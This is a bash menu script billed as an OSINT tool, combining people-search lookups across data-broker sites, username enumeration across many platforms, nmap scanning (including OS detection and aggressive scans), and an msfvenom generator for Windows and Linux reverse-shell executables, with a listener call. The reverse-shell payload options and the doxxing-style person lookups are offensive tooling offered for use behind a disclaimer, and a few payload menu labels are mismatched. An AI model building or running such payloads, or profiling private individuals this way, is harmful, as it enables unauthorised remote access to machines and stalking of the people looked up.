#!/bin/bash

#echo "Which color do you like best?"
#echo "1 - Blue"
#echo "2 - Red"
#echo "3 - Yellow"
#echo "4 - Green"
#echo "5 - Orange"
#read color;
#case $color in
#  1) echo "Blue is a primary color.";;
#  2) echo "Red is a primary color.";;
#  3) echo "Yellow is a primary color.";;
#  4) echo "Green is a secondary color.";;
#  5) echo "Orange is a secondary color.";;
#  *) echo "This color is not available. Please choose a different one.";; 
#esac

#NOTES
#This is my OSINT script inspired by Discover, 
#MAKER: mrblue
#If you use this script for illegal purposes I am not responsible.


##GLOBAL VARIABLE##

#LENGTH
long='================================================================================'
medium='============================================================'
short='========================================'

#COLOUR
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[1;32m' 

##############################################################################################################################

#banner
echo $long
echo -e "${GREEN}   ____       _       __     __              __${NC}"
echo -e "${GREEN}  / __ \_____(_)___  / /_   / /_____  ____  / /${NC}"
echo -e "${GREEN} / / / / ___/ / __ \/ __/  / __/ __ \/ __ \/ / ${NC}"
echo -e "${GREEN}/ /_/ (__  ) / / / / /_   / /_/ /_/ / /_/ / /  ${NC}"
echo -e "${GREEN}\____/____/_/_/ /_/\__/   \__/\____/\____/_/   ${NC}"
echo "By: mrblue" 
echo -e "${RED}If you use this script for illegal purposes I am not responsible.${NC}\n"
# http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20
echo $long

##############################################################################################################################

echo "Please choos one of the following options"

echo "[1] - people search."
echo "[2] - Username Search."
echo "[3] - NMAP"
echo "[4] - Generate_malicious_payload"
echo "[5] - Listner"
echo "[6] - Exit"
read script
case $script in
	1) 
echo "First_name:"
read First

echo "last_name:"
read last

open https://www.spokeo.com/$First-$last
open https://www.411.com/name/$First-$last
open https://www.advancedbackgroundchecks.com/names/$First-$last
open https://www.linkedin.com/jobs/search/?keywords=$First%20$last&refresh=true
open https://www.peekyou.com/$First_$last
open https://www.addresses.com/people/$First+$last
open https://www.spokeo.com/$First-$last
open https://twitter.com/search?q=%22$First%20$last%22
open https://www.youtube.com/results?search_query=$First+$last;;

##############################################################################################################################

	2)
echo "Enter a username: "
read username
echo "Checking usernmaes on $username"

echo -e "${GREEN}Chess:${NC} https://www.chess.com/member/$username"
echo -e "${GREEN}Facebook:${NC} https://www.facebook.com/$username"
echo -e "${GREEN}Fiver:${NC} https://www.fiverr.com/$username"
echo -e "${GREEN}FortniteTracker:${NC} https://fortnitetracker.com/profile/all/$username"
echo -e "${GREEN}Github:${NC} https://www.github.com/$username"
echo -e "${GREEN}Gitlab:${NC} https://gitlab.com/$username"
echo -e "${GREEN}Mouzz:${NC} https://houzz.com/user/$username"
echo -e "${GREEN}Instagram:${NC} https://www.instagram.com/$username"
echo -e "${GREEN}Kik:${NC} https://kik.me/$username"
echo -e "${GREEN}Lolchess:${NC}  https://lolchess.gg/profile/na/$username"
echo -e "${GREEN}Minecraft:${NC} https://api.mojang.com/users/profiles/minecraft/$username"
echo -e "${GREEN}MixCloud:${NC}  https://www.mixcloud.com/$username"
echo -e "${GREEN}MyMiniFactory:${NC} https://www.myminifactory.com/users/$username"
echo -e "${GREEN}NationStates Nation:${NC} https://nationstates.net/nation=$username"
echo -e "${GREEN}NationStates Region:${NC} https://nationstates.net/region=$username"
echo -e "${GREEN}Nightbot:${NC} https://nightbot.tv/t/$username/commands"
echo -e "${GREEN}Quizlet:${NC} https://quizlet.com/$username"
echo -e "${GREEN}Reddit:${NC} https://www.reddit.com/user/$username"
echo -e "${GREEN}Roblox:${NC} https://www.roblox.com/user.aspx?username=$username"
echo -e "${GREEN}Snapchat:${NC} https://www.snapchat.com/add/$username"
echo -e "${GREEN}Strava:${NC} https://www.strava.com/athletes/$username"
echo -e "${GREEN}TETR.IO:${NC} https://ch.tetr.io/u/$username"
echo -e "${GREEN}Twitch:${NC} https://www.twitch.tv/$username"
echo -e "${GREEN}Twitter:${NC} https://twitter.com/$username"
echo -e "${GREEN}Osu!:${NC} https://osu.ppy.sh/users/$username"
echo -e "${GREEN}Zoomit:${NC} https://www.zoomit.ir/user/$username";;
	
##############################################################################################################################

	3)
echo echo "Entter your ip:"
read ip

echo "enter Your port in range 1 to 65535:"
read port

echo "select a scan:"
echo 1 - OS_DETECTION:
echo 2 - AGGRESIVE SCAN:
echo 3 - BASIC SCAN:
echo 4 - VERSION_DETECTION:
    read scan

if [ $scan == 1 ]
then 
        echo "1 Selected:"
        nmap -O $ip -p $port

elif [ $scan == 2 ]
then
	 echo "2 Selected:"
   	 nmap -A $ip -p $port

elif [ $scan == 3 ]
then
	echo "3 Selected:"
	nmap -sC -sV $ip -p $port

elif [ $scan == 4 ]
then
    echo "4 Selected:"
    nmap -sV $ip -p $port

else
    echo "You Slected wrong scan!"
fi        
;;

##############################################################################################################################

	4)
echo "Entter your ip:"
read ip1

echo "Enter Your port in range 1 to 65535:"
read port1

echo "Select a payload:"
echo "[1] - Staged (Windows x86)"
echo "[2] - Staged (Windows x64)"
echo "[3] - Stageless (Windows x84)"
echo "[4] - Stageless (Windows x64)"
echo "[5] - Staged (Linux x86)"
echo "[6] - Staged (Linux x64)"
echo "[7] - Stageless (Linux x84)"
echo "[8] - Stageless (Linux x64)"

read shell

if [ $shell == 1 ]
then
	msfvenom -p windows/shell/reverse_tcp LHOST=$ip1 LPORT=$port1 -f exe > shell-x86.exe
elif [ $shell == 2 ]
then 
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip1 LPORT=$port1 -f exe > shell-x64.exe
elif [ $shell == 3 ]
then
	msfvenom -p windows/shell_reverse_tcp LHOST=$ip1 LPORT=$port1 -f exe > shell-x86.exe
elif [ $shell == 4 ]
then 
	msfvenom -p windows/shell_reverse_tcp LHOST=$ip1 LPORT=$port1 -f exe > shell-x64.exe
elif [ $shell == 5 ]
then
	msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip1 LPORT=$port1 -f elf > shell-x86.elf
elif [ $shell == 6 ]
then
	msfvenom -p linux/x64/shell/reverse_tcp LHOST=$ip1 LPORT=$port1 -f elf > shell-x64.elf
elif [ $shell == 7 ]
then
	msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip1 LPORT=$port1 -f elf > shell-x86.elf
elif [ $shell == 8 ]
then
	msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip1 LPORT=$port1 -f elf > shell-x64.elf
else
	echo "You selected wrong payload"
fi;;


##############################################################################################################################

	5) ./listner.sh;;

##############################################################################################################################

	6) exit;;

##############################################################################################################################

	*) echo "PLease choose another options, thank you.";;

esac
